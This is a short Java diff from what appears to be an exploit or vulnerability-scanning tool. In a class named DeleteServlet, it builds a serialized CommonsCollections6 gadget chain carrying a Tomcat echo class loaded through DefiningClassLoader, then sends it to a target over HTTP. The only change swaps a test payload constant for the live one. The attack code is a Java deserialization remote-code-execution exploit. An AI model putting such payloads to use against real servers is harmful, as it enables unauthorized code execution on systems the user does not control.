@@ -143,7 +143,7 @@ public class DeleteServlet extends VulnBase {
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos);
             oos.writeObject("yyds");
-            oos.writeObject(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.Tomcat7Echo, ClassCode.Tomcat7Echo_testzxcv4_TEST}));
+            oos.writeObject(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.Tomcat7Echo, ClassCode.Tomcat7Echo_testzxcv4}));
             HttpURLConnection exec_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
